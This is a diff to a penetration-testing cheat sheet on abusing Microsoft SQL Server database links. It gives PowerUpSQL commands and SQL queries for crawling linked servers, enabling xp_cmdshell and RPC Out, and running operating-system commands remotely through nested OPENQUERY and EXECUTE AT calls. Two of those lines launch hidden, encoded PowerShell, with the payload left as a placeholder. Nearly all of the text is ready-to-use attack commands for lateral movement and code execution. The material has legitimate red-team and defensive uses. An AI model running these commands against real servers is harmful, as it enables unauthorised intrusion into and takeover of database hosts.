@@ -1923,6 +1923,7 @@ Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Po
  
 ### Database links
 #### Search for links to remote servers
+- Check if `RPC_OUT` is enabled. If yes and link is configured with sysadmin we can enable xp_cmdshell.
 ```
 Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
 ```
@@ -1943,7 +1944,7 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
 ```
 
-#### Manually
+### Manual queries
 - https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
 - There is two methods ```openquery()``` and ```EXECUTE AT```.
 - Some times you won't be able to perform actions like exec xp_cmdshell from ```openquery()``` in those cases it might be worth it to test ```EXCUTE AT```
@@ -1953,30 +1954,33 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell
 SELECT * FROM master..sysservers
 ```
  
-#### Query a link for links
+#### Query a link - for example for more for links or information
 ```
 SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM master..sysservers;')
 SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'select @@servername');
 SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
 ```
  
-#### Example with double queries
+#### Example with double or tripple queries
 ```
 SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
 SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
 
 #### EXECUTE AT Enable xp_cmdshell
-- RPC out needs to be enabled - this isn't default
+- RPC out needs to be enabled - this isn't default!
 ```
 EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<DB>"
 EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<DB>"
+EXEC('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
 ```
  
-#### EXECUTE AT Example
-- Another way of executing through links
+#### EXECUTE AT enable RPC Out
+- Requires to be sysadmin on the SQL server, not sysadmin for the configured link!
+- Enter Srvname from enumerating links
 ```
-EXECUTE('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
+EXEC sp_serveroption
+@server='<SERVER>\<DB>', @optname='rpc out', @optvalue='True'
 ```
  
 ### Privilege escalation Service Accounts
